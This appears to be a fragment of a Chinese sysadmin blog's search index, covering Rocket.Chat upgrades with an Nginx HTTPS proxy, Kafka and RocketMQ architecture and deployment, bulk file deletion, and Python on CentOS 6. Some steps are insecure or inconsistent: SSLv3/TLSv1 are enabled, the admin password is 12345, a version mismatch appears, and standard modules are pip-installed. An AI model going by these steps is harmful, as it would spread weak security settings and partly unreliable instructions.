更新升级12345678910#停止服务systemctl stop rocketchat.service#进入安装目录cd &#x2F;opt&#x2F;#删除Rocket.Chat目录，删除前记得备份rm -rf Rocket.Chat注：上面操作完成，将安装Rocket.Chat步骤再操作一遍，记得数据库不要动就可以 使用123456使用上面的连接地址 http:&#x2F;&#x2F;10.0.10.50:3000&#x2F;在浏览器中打开，点击注册新账号，输入管理员姓名，电子邮件，两次密码，如下：姓名：admin电子邮件：admin@admin.com密码：12345点击提交，系统会提示你选择一个用户，直接选择管理员，点击使用此用户名继续。 配置SSL123音、视频服务以及客户端强制要求SSL。推荐 Lets Encrypt 免费证书配合http或者Nginx实现HTTPS访问·。证书获取：https:&#x2F;&#x2F;www.sslforfree.com&#x2F; 配置nginx1234yum install -y nginx主配置文件:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf确认include目录：&#x2F;etc&#x2F;nginx&#x2F;default.d 1234567891011121314151617181920212223242526272829cd &#x2F;etc&#x2F;nginx&#x2F;default.d &amp;&amp; vim sslupstream chat &#123; server 10.0.10.50:3000; &#125;server &#123; listen 80 default; server_name chat.test.com; #配置301跳转 return 301 https:&#x2F;&#x2F;$server_name$request_uri; &#125;server &#123; listen 443; ssl_certificate &#x2F;etc&#x2F;ssl&#x2F;fullchain.pem; ssl_certificate_key &#x2F;etc&#x2F;ssl&#x2F;privkey.key; ssl_dhparam &#x2F;etc&#x2F;ssl&#x2F;certs&#x2F;dhparams.pem; ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers HIGH:!aNULL:!MD5; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;chat; proxy_set_header Host $http_host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; &#125; &#125;&#125; 12systemctl enable nginxsystemctl restart nginx","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"IM","slug":"IM","permalink":"https://garywu520.github.io/tags/IM/"},{"name":"企业IM","slug":"企业IM","permalink":"https://garywu520.github.io/tags/%E4%BC%81%E4%B8%9AIM/"},{"name":"开源IM","slug":"开源IM","permalink":"https://garywu520.github.io/tags/%E5%BC%80%E6%BA%90IM/"}]},{"title":"Kafka Broker HA机制-进阶2","slug":"Kafka-Broker-HA机制-进阶2","date":"2017-11-20T13:29:19.000Z","updated":"2017-11-20T13:36:26.800Z","comments":true,"path":"2017/11/20/Kafka-Broker-HA机制-进阶2/","link":"","permalink":"https://garywu520.github.io/2017/11/20/Kafka-Broker-HA%E6%9C%BA%E5%88%B6-%E8%BF%9B%E9%98%B62/","excerpt":"","text":"从图中可以看出HA的缓存分为生产缓存事件池和拉取缓存事件池两块结构相同的缓存区，分别缓存生产和拉取请求 2个缓存事件池的作用： 生产缓存事件池：当生产者设置了等待从partition的同步选项(requiredAcks为-1)时才会启动生产缓存。因为每一批生产的消息，需要等待所有的处于同步状态的从partition（in-sync）同步成功，在所有follow partition上报自己的水位线追上leader partition之前，生产请求会一直保留在生产缓存中，等待直到超时。 拉取缓存事件池：拉取请求为什么也需要缓存？因为kafka在消费消息时有一个默认选项，一次拉取最低消费1条消息。那么，如果消费者拉取的时候没有任何新消息生产，则拉取请求会保留到拉取缓存中，等待直到超时。这一定程度上避免了反复拉取一批空消息占用带宽资源的问题，不过也把Kafka的ha缓存架构的复杂度提升了一个等级。","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"kafka broker","slug":"kafka-broker","permalink":"https://garywu520.github.io/tags/kafka-broker/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"HA","slug":"HA","permalink":"https://garywu520.github.io/tags/HA/"},{"name":"Producer","slug":"Producer","permalink":"https://garywu520.github.io/tags/Producer/"},{"name":"HA缓存","slug":"HA缓存","permalink":"https://garywu520.github.io/tags/HA%E7%BC%93%E5%AD%98/"},{"name":"leader Partition","slug":"leader-Partition","permalink":"https://garywu520.github.io/tags/leader-Partition/"},{"name":"follow partitions","slug":"follow-partitions","permalink":"https://garywu520.github.io/tags/follow-partitions/"}]},{"title":"Apache Kafka原理详解-进阶1","slug":"Apache-Kafka原理详解-进阶1","date":"2017-11-20T12:35:01.000Z","updated":"2017-11-20T13:08:34.176Z","comments":true,"path":"2017/11/20/Apache-Kafka原理详解-进阶1/","link":"","permalink":"https://garywu520.github.io/2017/11/20/Apache-Kafka%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3-%E8%BF%9B%E9%98%B61/","excerpt":"kafka消息队列-调研 背景 12kafka是最初由Linkedin公司开发，使用Scala语言编写，Kafka是一个分布式、分区的、多副本的、多订阅者的日志系统(分布式MQ系统)，可以用于web&#x2F;nginx日志，搜索日志，监控日志，访问日志等等。kafka目前支持多种客户端语言：java，python，c++，php等等。 整体架构","text":"kafka消息队列-调研 背景 12kafka是最初由Linkedin公司开发，使用Scala语言编写，Kafka是一个分布式、分区的、多副本的、多订阅者的日志系统(分布式MQ系统)，可以用于web&#x2F;nginx日志，搜索日志，监控日志，访问日志等等。kafka目前支持多种客户端语言：java，python，c++，php等等。 整体架构 kafka名词解释和工作方式 1234567891011121314Producer ：消息生产者，就是向kafka broker发消息的客户端。Consumer ：消息消费者，向kafka broker取消息的客户端Topic ：咋们可以理解为一个队列。Consumer Group （CG）：这是kafka用来实现一个topic消息的广播（发给所有的consumer）和单播（发给任意一个consumer）的手段。一个topic可以有多个CG。topic的消息会复制（不是真的复制，是概念上的）到所有的CG，但每个CG只会把消息发给该CG中的一个consumer。如果需要实现广播，只要每个consumer有一个独立的CG就可以了。要实现单播只要所有的consumer在同一个CG。用CG还可以将consumer进行自由的分组而不需要多次发送消息到不同的topic。Broker ：一台kafka服务器就是一个broker。一个集群由多个broker组成。一个broker可以容纳多个topic。Partition：为了实现扩展性，一个非常大的topic可以分布到多个broker（即服务器）上，一个topic可以分为多个partition，每个partition是一个有序的队列。partition中的每条消息都会被分配一个有序的id（offset）。kafka只保证按一个partition中的顺序将消息发给consumer，不保证一个topic的整体（多个partition间）的顺序。Offset：kafka的存储文件都是按照offset.kafka来命名，用offset做名字的好处是方便查找。例如你想找位于2049的位置，只要找到2048.kafka的文件即可。当然the first offset就是00000000000.kafka kafka特性 123456789101112通过O(1)的磁盘数据结构提供消息的持久化，这种结构对于即使数以TB的消息存储也能够保持长时间的稳定性能。高吞吐量：即使是非常普通的硬件kafka也可以支持每秒数十万的消息。支持同步和异步复制两种HAConsumer客户端pull，随机读,利用sendfile系统调用，zero-copy ,批量拉数据消费状态保存在客户端消息存储顺序写数据迁移、扩容对用户透明支持Hadoop并行数据加载。支持online和offline的场景。持久化：通过将数据持久化到硬盘以及replication防止数据丢失。scale out：无需停机即可扩展机器。定期删除机制，支持设定partitions的segment file保留时间。 可靠性(一致性) 12345kafka(MQ)要实现从producer到consumer之间的可靠的消息传送和分发。传统的MQ系统通常都是通过broker和consumer间的确认（ack）机制实现的，并在broker保存消息分发的状态。即使这样一致性也是很难保证的。kafka的做法是由consumer自己保存状态，也不要任何确认。这样虽然consumer负担更重，但其实更灵活了。因为不管consumer上任何原因导致需要重新处理消息，都可以再次从broker获得。 kafka系统扩展性 123kafka使用zookeeper来实现动态的集群扩展，不需要更改客户端（producer和consumer）的配置。broker会在zookeeper注册并保持相关的元数据（topic，partition信息等）更新。而客户端会在zookeeper上注册相关的watcher。一旦zookeeper发生变化，客户端能及时感知并作出相应调整。这样就保证了添加或去除broker时，各broker间仍能自动实现负载均衡。 kafka设计目标 123456高吞吐量是其核心设计之一。 - 数据磁盘持久化：消息不在内存中cache，直接写入到磁盘，充分利用磁盘的顺序读写性能。 - zero-copy：减少IO操作步骤。 - 支持数据批量发送和拉取。 - 支持数据压缩。 - Topic划分为多个partition，提高并行处理能力。 Producer负载均衡和HA机制 1234- producer根据用户指定的算法，将消息发送到指定的partition。- 存在多个partiiton，每个partition有自己的replica，每个replica分布在不同的Broker节点上。- 多个partition需要选取出lead partition，lead partition负责读写，并由zookeeper负责fail over。- 通过zookeeper管理broker与consumer的动态加入与离开。 Consumer的pull机制 1234由于kafka broker会持久化数据，broker没有cahce压力，因此，consumer比较适合采取pull的方式消费数据，具体特别如下： - 简化kafka设计，降低了难度。 - Consumer根据消费能力自主控制消息拉取速度。 - Consumer根据自身情况自主选择消费模式，例如批量，重复消费，从制定partition或位置(offset)开始消费等. Consumer与topic关系以及机制 12345678910本质上kafka只支持Topic.每个consumer属于一个consumer group;反过来说,每个group中可以有多个consumer.对于Topic中的一条特定的消息,只会被订阅此Topic的每个group中的一个consumer消费,此消息不会发送给一个group的多个consumer;那么一个group中所有的consumer将会交错的消费整个Topic.如果所有的consumer都具有相同的group,这种情况和JMS queue模式很像;消息将会在consumers之间负载均衡.如果所有的consumer都具有不同的group,那这就是&quot;发布-订阅&quot;;消息将会广播给所有的消费者.在kafka中,一个partition中的消息只会被group中的一个consumer消费(同一时刻);每个group中consumer消息消费互相独立;我们可以认为一个group是一个&quot;订阅&quot;者,一个Topic中的每个partions,只会被一个&quot;订阅者&quot;中的一个consumer消费,不过一个consumer可以同时消费多个partitions中的消息.kafka只能保证一个partition中的消息被某个consumer消费时是顺序的.事实上,从Topic角度来说,当有多个partitions时,消息仍不是全局有序的. 通常情况下,一个group中会包含多个consumer,这样不仅可以提高topic中消息的并发消费能力,而且还能提高&quot;故障容错&quot;性,如果group中的某个consumer失效,那么其消费的partitions将会有其他consumer自动接管.kafka的设计原理决定,对于一个topic,同一个group中不能有多于partitions个数的consumer同时消费,否则将意味着某些consumer将无法得到消息. Producer均衡算法 12345kafka集群中的任何一个broker,都可以向producer提供metadata信息,这些metadata中包含&quot;集群中存活的servers列表&quot;&#x2F;&quot;partitions leader列表&quot;等信息.当producer获取到metadata信心之后, producer将会和Topic下所有partition leader保持socket连接;消息由producer直接通过socket发送到broker,中间不会经过任何&quot;路由层&quot;.事实上,消息被路由到哪个partition上,有producer客户端决定.比如可以采用&quot;random&quot;&quot;key-hash&quot;&quot;轮询&quot;等,如果一个topic中有多个partitions,那么在producer端实现&quot;消息均衡分发&quot;是必要的.在producer端的配置文件中,开发者可以指定partition路由的方式. Consumer均衡算法 1234567当一个group中,有consumer加入或者离开时,会触发partitions均衡.均衡的最终目的,是提升topic的并发消费能力.1) 假如topic1,具有如下partitions: P0,P1,P2,P32) 加入group中,有如下consumer: C0,C13) 首先根据partition索引号对partitions排序: P0,P1,P2,P34) 根据consumer.id排序: C0,C15) 计算倍数: M &#x3D; [P0,P1,P2,P3].size &#x2F; [C0,C1].size,本例值M&#x3D;2(向上取整)6) 然后依次分配partitions: C0 &#x3D; [P0,P1],C1&#x3D;[P2,P3],即Ci &#x3D; [P(i * M),P((i + 1) * M -1)] kafka broker集群内broker间replica(副本)机制 1234567kafka中,replication策略是基于partition,而不是topic;kafka将每个partition数据复制到多个server上,任何一个partition有一个leader和多个follower(可以没有);备份的个数可以通过broker配置文件来设定.leader处理所有的read-write请求,follower需要和leader保持同步.Follower就像一个&quot;consumer&quot;,消费消息并保存在本地日志中;leader负责跟踪所有的follower状态,如果follower&quot;落后&quot;太多或者失效,leader将会把它从replicas同步列表中删除.当所有的follower都将一条消息保存成功,此消息才被认为是&quot;committed&quot;,那么此时consumer才能消费它,这种同步策略,就要求follower和leader之间必须具有良好的网络环境.即使只有一个replicas实例存活,仍然可以保证消息的正常发送和接收,只要zookeeper集群存活即可.(备注:不同于其他分布式存储,比如hbase需要&quot;多数派&quot;存活才行) kafka判定一个follower存活与否的条件 1234567891011121314151617181) follower需要和zookeeper保持良好的链接 2) 它必须能够及时的跟进leader,不能落后太多.如果同时满足上述2个条件,那么leader就认为此follower是&quot;活跃的&quot;.如果一个follower失效(server失效)或者落后太多,leader将会把它从同步列表中移除.注:如果此replicas落后太多,它将会继续从leader中fetch数据,直到足够up-to-date,然后再次加入到同步列表中;kafka不会更换replicas宿主!因为&quot;同步列表&quot;中replicas需要足够快,这样才能保证producer发布消息时接受到ACK的延迟较小。 当leader失效时,需在followers中选取出新的leader,可能此时follower落后于leader,因此需要选择一个&quot;up-to-date&quot;的follower.kafka中leader选举并没有采用&quot;投票多数派&quot;的算法,因为这种算法对于&quot;网络稳定性&quot;&#x2F;&quot;投票参与者数量&quot;等条件有较高的要求,而且kafka集群的设计,还需要容忍N-1个replicas失效.对于kafka而言,每个partition中所有的replicas信息都可以在zookeeper中获得,那么选举leader将是一件非常简单的事情.选择follower时需要兼顾一个问题: 就是新leader server上所已经承载的partition leader的个数,如果一个server上有过多的partition leader,意味着此server将承受着更多的IO压力.在选举新leader,需要考虑到&quot;负载均衡&quot;,partition leader较少的broker将会更有可能成为新的leader.在整几个集群中,只要有一个replicas存活,那么此partition都可以继续接受读写操作. 总结123451) Producer端直接连接broker.list列表,从列表中返回TopicMetadataResponse,该Metadata包含Topic下每个partition leader建立socket连接并发送消息.2) Broker端使用zookeeper用来注册broker信息,以及监控partition leader存活性.3) Consumer端使用zookeeper用来注册consumer信息,其中包括consumer消费的partition列表等,同时也用来发现broker列表,并和partition leader建立socket连接,并获取消息. 参考：Kafka概要介绍","categories":[],"tags":[{"name":"kafka","slug":"kafka","permalink":"https://garywu520.github.io/tags/kafka/"},{"name":"zookeeper","slug":"zookeeper","permalink":"https://garywu520.github.io/tags/zookeeper/"},{"name":"producer","slug":"producer","permalink":"https://garywu520.github.io/tags/producer/"},{"name":"consumer","slug":"consumer","permalink":"https://garywu520.github.io/tags/consumer/"},{"name":"broker","slug":"broker","permalink":"https://garywu520.github.io/tags/broker/"},{"name":"Topic","slug":"Topic","permalink":"https://garywu520.github.io/tags/Topic/"},{"name":"MQ","slug":"MQ","permalink":"https://garywu520.github.io/tags/MQ/"},{"name":"kafka broker","slug":"kafka-broker","permalink":"https://garywu520.github.io/tags/kafka-broker/"},{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"}]},{"title":"分布式消息队列RocketMQ部署-进阶2","slug":"分布式消息队列RocketMQ部署-进阶2","date":"2017-11-16T11:47:39.000Z","updated":"2017-11-20T13:42:21.084Z","comments":true,"path":"2017/11/16/分布式消息队列RocketMQ部署-进阶2/","link":"","permalink":"https://garywu520.github.io/2017/11/16/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97RocketMQ%E9%83%A8%E7%BD%B2-%E8%BF%9B%E9%98%B62/","excerpt":"RocketMQ原理 参考：分布式消息队列RocketMQ原理-进阶1 分布式部署架构","text":"RocketMQ原理 参考：分布式消息队列RocketMQ原理-进阶1 分布式部署架构 RocketMQ分布式部署 环境说明 IP地址 主机名 OS 角色 架构模式 10.0.10.25 rocketmq-master1 CentOS6 nameserver、brokerserver Master1 10.0.10.26 rocketmq-master2 CentOS6 nameserver、brokerserver Master2 hosts信息添加[全节点操作] 123456#vim &#x2F;etc&#x2F;hosts10.0.10.25 mqnameserver110.0.10.26 mqnameserver210.0.10.25 rocketmq-master110.0.10.26 rocketmq-master2 JDK安装[全节点操作] 1234567891011121314151617wget http:&#x2F;&#x2F;mirrors.linuxeye.com&#x2F;jdk&#x2F;jdk-7u80-linux-x64.tar.gzmkdir -p &#x2F;usr&#x2F;local&#x2F;jdktar -zxvf jdk-7u80-linux-x64.tar.gz -C &#x2F;usr&#x2F;local&#x2F;jdkcd &#x2F;usr&#x2F;local&#x2F;jdk&#x2F;jdk1.7.0_80&#x2F; &amp;&amp; mv .&#x2F;* ..&#x2F; cd .. &amp;&amp; rm -rf jdk1.7.0_80&#x2F;#配置环境变量export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;binexport JAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;jdkexport CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jarexport PATH&#x3D;$PATH:$JAVA_HOME&#x2F;binexport ROCKETMQ_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;rocketmqexport PATH&#x3D;$PATH::$ROCKETMQ_HOME&#x2F;bin#刷新环境变量source &#x2F;etc&#x2F;profile RocketMQ安装[全节点操作] 12345678910111213141516171819RocketMQ Github项目主页：https:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;RocketMQ&#x2F;releaseshttps:&#x2F;&#x2F;github.com&#x2F;alibaba&#x2F;rocketmq&#x2F;releases&#x2F;download&#x2F;v3.2.6&#x2F;alibaba-rocketmq-3.2.6.tar.gztar -zxvf v3.5.8.tar.gz -C &#x2F;usr&#x2F;localln -s rocketmq-3.5.8 rocketmq#接下来执行&#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;bin目录下的 os.sh脚本#echo &#39;deadline&#39; &gt; &#x2F;sys&#x2F;block&#x2F;$&#123;DISK&#125;&#x2F;queue&#x2F;schedulerecho &#39;deadline&#39; &gt; &#x2F;sys&#x2F;block&#x2F;sda&#x2F;queue&#x2F;schedulersu - root -c &#39;ulimit -n&#39;#cat &#x2F;sys&#x2F;block&#x2F;$DISK&#x2F;queue&#x2F;schedulercat &#x2F;sys&#x2F;block&#x2F;sda&#x2F;queue&#x2F;scheduler说明：第一：$&#123;DISK&#125;获取不到sda，所以变量需要改为sda; 第二：ulimit相关设置：admin没有此用户，所以需要改为root#执行RocketMQ官方提供的优化脚本cd &#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;bin &amp;&amp; sh os.sh RocketMQ配置 Master1服务器配置： 12345cd &#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;conf&#x2F;2m-noslave&#x2F;mkdir -p &#x2F;data&#x2F;rocketmq&#x2F;store&#x2F;commitlog &#x2F;data&#x2F;logvim broker-a.properties #注：此处文件名为broker-a.properties只关注带中文备注的参数即可 123456789101112131415161718192021222324252627282930313233brokerClusterName&#x3D;AdpMqCluster #定义ClusterNamebrokerName&#x3D;broker-a #定义brokerNamebrokerId&#x3D;0 namesrvAddr&#x3D;10.0.10.25:9876;10.0.10.26:9876 #配置nameserver服务器地址，以&quot;;&quot;分割defaultTopicQueueNums&#x3D;4autoCreateTopicEnable&#x3D;trueautoCreateSubscriptionGroup&#x3D;truelistenPort&#x3D;10911deleteWhen&#x3D;04fileReservedTime&#x3D;120mapedFileSizeCommitLog&#x3D;1073741824mapedFileSizeConsumeQueue&#x3D;50000000destroyMapedFileIntervalForcibly&#x3D;120000redeleteHangedFileInterval&#x3D;120000diskMaxUsedSpaceRatio&#x3D;88storePathRootDir&#x3D;&#x2F;data&#x2F;rocketmq&#x2F;store #定义store根路径storePathCommitLog&#x3D;&#x2F;data&#x2F;rocketmq&#x2F;store&#x2F;commitlog #定义commitlogmaxMessageSize&#x3D;65536flushCommitLogLeastPages&#x3D;4flushConsumeQueueLeastPages&#x3D;2flushCommitLogThoroughInterval&#x3D;10000flushConsumeQueueThoroughInterval&#x3D;60000brokerRole&#x3D;ASYNC_MASTERflushDiskType&#x3D;ASYNC_FLUSHcheckTransactionMessageEnable&#x3D;falsesendMessageThreadPoolNums&#x3D;128pullMessageThreadPoolNums&#x3D;128 Master2服务器配置： 123cd &#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;conf&#x2F;2m-noslave&#x2F;mkdir -p &#x2F;data&#x2F;rocketmq&#x2F;store&#x2F;commitlog &#x2F;data&#x2F;logvim broker-b.properties #注：此处文件名为broker-b.properties 123456789101112131415161718192021222324252627282930313233brokerClusterName&#x3D;AdpMqCluster #定义ClusterName,与Master1配置一样，同属于一个集群brokerName&#x3D;broker-b #定义brokerName，此处是broker-bbrokerId&#x3D;1namesrvAddr&#x3D;10.0.10.25:9876;10.0.10.26:9876 #配置nameserver服务器地址，以&quot;;&quot;分割defaultTopicQueueNums&#x3D;4autoCreateTopicEnable&#x3D;trueautoCreateSubscriptionGroup&#x3D;truelistenPort&#x3D;10911deleteWhen&#x3D;04fileReservedTime&#x3D;120mapedFileSizeCommitLog&#x3D;1073741824mapedFileSizeConsumeQueue&#x3D;50000000destroyMapedFileIntervalForcibly&#x3D;120000redeleteHangedFileInterval&#x3D;120000diskMaxUsedSpaceRatio&#x3D;88storePathRootDir&#x3D;&#x2F;data&#x2F;rocketmq&#x2F;store #定义store根路径storePathCommitLog&#x3D;&#x2F;data&#x2F;rocketmq&#x2F;store&#x2F;commitlog #定义commitlogmaxMessageSize&#x3D;65536flushCommitLogLeastPages&#x3D;4flushConsumeQueueLeastPages&#x3D;2flushCommitLogThoroughInterval&#x3D;10000flushConsumeQueueThoroughInterval&#x3D;60000brokerRole&#x3D;ASYNC_MASTERflushDiskType&#x3D;ASYNC_FLUSHcheckTransactionMessageEnable&#x3D;falsesendMessageThreadPoolNums&#x3D;128pullMessageThreadPoolNums&#x3D;128 runbroker.sh参数调整[全节点操作] 1234runbroker.sh需要根据内存大小进行适当地调整cd &#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;binJAVA_OPT&#x3D;&quot;$&#123;JAVA_OPT&#125; -server -Xms4g -Xmx4g -Xmn2g -XX:PermSize&#x3D;128m -XX:MaxPermSize&#x3D;320m&quot; 服务启动 [全节点操作] 12#修改配置文件的日志路径,改为&#x2F;data目录下cd &#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;conf &amp;&amp; sed -i &#39;s#$&#123;user.home&#125;#&#x2F;data#g&#39; *.xml 启动NameServer[全节点操作] 12cd &#x2F;usr&#x2F;local&#x2F;rocketmq&#x2F;binnohup sh mqnamesrv &amp;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"消息队列","slug":"消息队列","permalink":"https://garywu520.github.io/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://garywu520.github.io/tags/RocketMQ/"},{"name":"分布式消息队列","slug":"分布式消息队列","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"},{"name":"nameserver","slug":"nameserver","permalink":"https://garywu520.github.io/tags/nameserver/"},{"name":"brokerserver","slug":"brokerserver","permalink":"https://garywu520.github.io/tags/brokerserver/"}]},{"title":"批量删除100w+文件或目录-Linux","slug":"批量删除1w-文件或目录-Linux","date":"2017-11-16T09:34:58.000Z","updated":"2017-11-16T09:47:15.879Z","comments":true,"path":"2017/11/16/批量删除1w-文件或目录-Linux/","link":"","permalink":"https://garywu520.github.io/2017/11/16/%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A41w-%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95-Linux/","excerpt":"批量删除100万+文件 12345#cd到指定目录cd &#x2F;tmpfind .&#x2F; -type d -exec rm -rf &#123;&#125; \\; 提示“-bash: &#x2F;bin&#x2F;rm: Argument list too long”","text":"批量删除100万+文件 12345#cd到指定目录cd &#x2F;tmpfind .&#x2F; -type d -exec rm -rf &#123;&#125; \\; 提示“-bash: &#x2F;bin&#x2F;rm: Argument list too long” 正确姿势 123456cd &#x2F;tmpls | xargs -n 50 rm -fr ls 意思是列出当前目录下的所有文件或目录，然后以50个为一组的方式来删除。其中这个值50可以根据实际情况调大或调小","categories":[],"tags":[{"name":"Argument list too long","slug":"Argument-list-too-long","permalink":"https://garywu520.github.io/tags/Argument-list-too-long/"},{"name":"SHELL编程","slug":"SHELL编程","permalink":"https://garywu520.github.io/tags/SHELL%E7%BC%96%E7%A8%8B/"}]},{"title":"CentOS6.X安装Python2.7","slug":"CentOS6-升级Python3","date":"2017-11-16T05:57:51.000Z","updated":"2018-06-25T09:03:27.764Z","comments":true,"path":"2017/11/16/CentOS6-升级Python3/","link":"","permalink":"https://garywu520.github.io/2017/11/16/CentOS6-%E5%8D%87%E7%BA%A7Python3/","excerpt":"升级Python到2.7 1Centos 6.X自带Python 2.6，但是工作中可能为了满足需求而进行升级，一般的升级过程会导致很多问题，比如yum不能使用等等......而此方法不会导致问题。","text":"升级Python到2.7 1Centos 6.X自带Python 2.6，但是工作中可能为了满足需求而进行升级，一般的升级过程会导致很多问题，比如yum不能使用等等......而此方法不会导致问题。 123CentOS 上安装SCL源yum install centos-release-scl 检查可用的Python版本 1234567891011121314yum info rh-python35 或 yum info python27如:Name : rh-python35Arch : x86_64Version : 2.0Release : 2.el6Size : 0.0Repo : installedFrom repo : centos-sclo-rhSummary : Package that installs rh-python35License : GPLv2+Description : This is the main package for rh-python35 Software Collection. 安装python35 1yum install -y rh-python35 启用新版本Python35 123scl enable rh-python35 bash 或scl enable python27 bash 检查新版本 1python -V 软链pip命令 123456软链pip命令ln -sv &#x2F;opt&#x2F;rh&#x2F;rh-python35&#x2F;root&#x2F;usr&#x2F;bin&#x2F;pip* &#x2F;usr&#x2F;sbin&#x2F; 注：&#x2F;opt&#x2F;rh&#x2F;rh-python35&#x2F;root&#x2F;usr&#x2F;bin&#x2F; 是当前python默认安装目录附录：pip升级 cd &#x2F;opt&#x2F;rh&#x2F;rh-python35&#x2F;root&#x2F;usr&#x2F;bin&#x2F; &amp;&amp; .&#x2F;pip3.5 install --upgrade pip 安装第三方库 1pip3.5 install requests time json datatime os scrapy threading jsonpath etree 以下是python27安装库 12345以下适用于python27cd &#x2F;opt&#x2F;rh&#x2F;python27&#x2F;root&#x2F;usr&#x2F;bin&#x2F; #切换到Python安装目录sudo LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH .&#x2F;easy_install-2.7 pipsudo LD_LIBRARY_PATH&#x3D;$LD_LIBRARY_PATH .&#x2F;pip2.7 install requests 开机后自动使用Python35版本 123可以选择修改某个用户的环境变量：echo &quot;scl enable rh-python35 bash&quot; &gt;&gt;&#x2F;etc&#x2F;profilesource &#x2F;etc&#x2F;profile","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Python","slug":"Python","permalink":"https://garywu520.github.io/tags/Python/"},{"name":"CentOS6","slug":"CentOS6","permalink":"https://garywu520.github.io/tags/CentOS6/"},{"name":"Python2.7","slug":"Python2-7","permalink":"https://garywu520.github.io/tags/Python2-7/"},{"name":"python27","slug":"python27","permalink":"https://garywu520.github.io/tags/python27/"},{"name":"python35","slug":"python35","permalink":"https://garywu520.github.io/tags/python35/"},{"name":"SCL","slug":"SCL","permalink":"https://garywu520.github.io/tags/SCL/"}]},{"title":"分布式消息队列RocketMQ原理-进阶1","slug":"分布式消息队列RocketMQ原理-进阶1","date":"2017-11-14T10:33:09.000Z","updated":"2017-11-14T11:03:40.301Z","comments":true,"path":"2017/11/14/分布式消息队列RocketMQ原理-进阶1/","link":"","permalink":"https://garywu520.github.io/2017/11/14/%E5%88%86%E5%B8%83%E5%BC%8F%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97RocketMQ%E5%8E%9F%E7%90%86-%E8%BF%9B%E9%98%B61/","excerpt":"RocketMQ介绍 12RocketMQ是阿里开源的一款分布式、高性能、高吞吐量的消息中间件。所谓消息中间件，即与两个角色有关：消息生产者和消息消费者。消息生产者负责创建消息并发送到RocketMQ服务器，RocketMQ服务器会将消息持久化到磁盘，消息消费者从RocketMQ服务器拉取消息并提交给应用消费。","text":"RocketMQ介绍 12RocketMQ是阿里开源的一款分布式、高性能、高吞吐量的消息中间件。所谓消息中间件，即与两个角色有关：消息生产者和消息消费者。消息生产者负责创建消息并发送到RocketMQ服务器，RocketMQ服务器会将消息持久化到磁盘，消息消费者从RocketMQ服务器拉取消息并提交给应用消费。 快速理解&lt;生产消息&gt;与&lt;消费消息&gt; RocketMQ特点 123451、支持严格的消息顺序；2、支持Topic与Queue两种模式；3、亿级消息堆积能力；4、比较友好的分布式特性；5、同时支持Push与Pull方式消费消息； 架构图 RocketMQ集群方式优缺点 1234单个master:这种方式风险较大，一旦Broker重启或者宕机时，会导致整个服务不可用，不建议线上环境使用。 123456789101112多Master模式:一个集群无 Slave，全是 Master，例如 2 个 Master 或者 3 个 Master优点：配置简单，单个Master 宕机或重启维护对应用无影响，在磁盘配置为RAID10 时，即使机器宕机不可恢复情况下，由与 RAID10磁盘非常可靠，消息也不会丢（异步刷盘丢失少量消息，同步刷盘一条不丢）。性能最高。缺点：单台机器宕机期间，这台机器上未被消费的消息在机器恢复之前不可订阅，消息实时性会受到受到影响。先启动 NameServer在机器 A，启动第一个 Master在机器 B，启动第二个 Master 12345678910111213多 Master 多 Slave 模式，异步复制:每个 Master 配置一个 Slave，有多对Master-Slave，HA采用异步复制方式，主备有短暂消息延迟，毫秒级。优点：即使磁盘损坏，消息丢失的非常少，且消息实时性不会受影响，因为Master 宕机后，消费者仍然可以从 Slave消费，此过程对应用透明。不需要人工干预。性能同多 Master 模式几乎一样。缺点：Master 宕机，磁盘损坏情况，会丢失少量消息。先启动 NameServer在机器 A，启动第一个 Master在机器 B，启动第二个 Master在机器 C，启动第一个 Slave在机器 D，启动第二个 Slave 1234567891011121314151617多 Master 多 Slave 模式，同步双写:每个 Master 配置一个 Slave，有多对Master-Slave，HA采用同步双写方式，主备都写成功，向应用返回成功。优点：数据与服务都无单点，Master宕机情况下，消息无延迟，服务可用性与数据可用性都非常高缺点：性能比异步复制模式略低，大约低 10%左右，发送单个消息的 RT会略高。目前主宕机后，备机不能自动切换为主机，后续会支持自动切换功能。先启动 NameServer在机器 A，启动第一个 Master在机器 